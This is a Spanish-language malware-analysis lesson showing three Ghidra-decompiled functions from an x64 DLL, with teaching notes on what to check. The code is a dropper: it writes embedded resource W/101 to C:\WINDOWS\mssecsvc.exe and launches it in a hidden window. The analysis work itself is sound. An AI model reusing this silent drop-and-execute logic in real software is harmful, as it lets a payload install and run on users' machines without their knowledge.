# P4 — Código seleccionado para lectura

**Lectura visual:** [diagramas de flujo de este componente](diagramas.md).

**Alcance inicial:** 3 funciones transcritas de 265 reconocidas por Ghidra.
Consulta [qué falta y cómo ampliar P4](../ALCANCE-Y-AMPLIACION.md#p4);
la selección no equivale al análisis completo del componente.

[Guía de esta persona](README.md) · [Índice del equipo](../README.md)

Componente SHA-256: `ec138352c4726fa3b6706b30bf4692252f818108c8066e8518920dd9823a34bb`. Arquitectura: **x64, PE32+, DLL**.

Consulta de origen (UTC): `2026-11-15T17:54:00.726286+00:00`. Ghidra **12.2 DEV**.

Cuerpos transcritos del Decompiler, con normalización de espacios; las explicaciones exteriores son editoriales. No es código fuente original ni preparado para compilar. Los comentarios y nombres españoles dentro del código pertenecen al analista.

El JSON original y las muestras se conservan localmente, fuera de Git. La identidad y los hashes de texto están en [indice.json](../indice.json).

## Navegación

- [1800011a4 — PlayGame: orden previsto](#f-1800011a4)
- [180001014 — W/101 y avance de cuatro bytes](#f-180001014)
- [1800010f8 — Solicitud de lanzamiento](#f-1800010f8)

<a id="f-1800011a4"></a>

## 1800011a4 — PlayGame: orden previsto

Nombre en la exportación: `PlayGame-1800011a4`.

**Qué mirar:** Reconstruye la ruta formada por sprintf. Entre extracción y solicitud de proceso no hay una condición que compruebe éxito.

```c
undefined8 PlayGame(void)

{
                    /* 0x11a4  1  PlayGame */
  sprintf(&DAT_18000d2a0,"C:\\%s\\%s","WINDOWS","mssecsvc.exe");
  Extraer_Recurso_W_101();
  Crear_Proceso_Carga();
  return 0;
}
```

**Límite de la conclusión:** Una exportación no prueba que fuera invocada; tampoco demuestra quién la invocó ni dónde.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-180001014"></a>

## 180001014 — W/101 y avance de cuatro bytes

Nombre en la exportación: `Extraer_Recurso_W_101-180001014`.

**Qué mirar:** Relaciona 0x65 con 101, *pDVar2 con longitud y pDVar2 + 1 con un avance de cuatro bytes. Busca qué resultados se comprueban.

```c
/* FindResourceA ID 0x65, tipo W. Primer DWORD = tamaño; WriteFile comienza en recurso+4. No hay
   descifrado en esta rutina. */

undefined8 Extraer_Recurso_W_101(void)

{
  DWORD DVar1;
  HRSRC hResInfo;
  HGLOBAL hResData;
  DWORD *pDVar2;
  HANDLE hFile;
  DWORD local_res8 [2];

  hResInfo = FindResourceA(DAT_18000d3a8,(LPCSTR)0x65,"W");
  if ((((hResInfo == (HRSRC)0x0) ||
       (hResData = LoadResource(DAT_18000d3a8,hResInfo), hResData == (HGLOBAL)0x0)) ||
      (pDVar2 = LockResource(hResData), pDVar2 == (DWORD *)0x0)) ||
     (DVar1 = SizeofResource(DAT_18000d3a8,hResInfo), DVar1 == 0)) {
    return 0;
  }
  DVar1 = *pDVar2;
  hFile = CreateFileA(&DAT_18000d2a0,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,4,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffffffffffff) {
    WriteFile(hFile,pDVar2 + 1,DVar1,local_res8,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
  }
  return 1;
}
```

**Límite de la conclusión:** No se verifica el resultado de WriteFile. Tras superar las comprobaciones iniciales puede retornar 1 aunque CreateFileA falle; no confundir retorno con éxito de escritura.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-1800010f8"></a>

## 1800010f8 — Solicitud de lanzamiento

Nombre en la exportación: `Crear_Proceso_Carga-1800010f8`.

**Qué mirar:** La ruta global es la construida por PlayGame. Se comprueba CreateProcessA para cerrar handles y después se retorna cero.

```c
/* CreateProcessA sobre ruta global. Comprobación estática; no atribuye un vector de infección
   histórico. */

undefined8 Crear_Proceso_Carga(void)

{
  BOOL BVar1;
  _PROCESS_INFORMATION local_98;
  _STARTUPINFOA local_78;

  local_98.hProcess = (HANDLE)0x0;
  local_98.hThread = (HANDLE)0x0;
  local_98.dwProcessId = 0;
  local_98.dwThreadId = 0;
  FUN_1800011f0(&local_78.lpReserved,0,0x60);
  local_78.cb = 0x68;
  local_78.wShowWindow = 0;
  local_78.dwFlags = 0x81;
  BVar1 = CreateProcessA((LPCSTR)0x0,&DAT_18000d2a0,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,&local_78,
                         &local_98);
  if (BVar1 != 0) {
    CloseHandle(local_98.hThread);
    CloseHandle(local_98.hProcess);
  }
  return 0;
}
```

**Límite de la conclusión:** Ni retornar cero significa necesariamente fallo del proceso ni cerrar handles significa que ese proceso terminó.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).
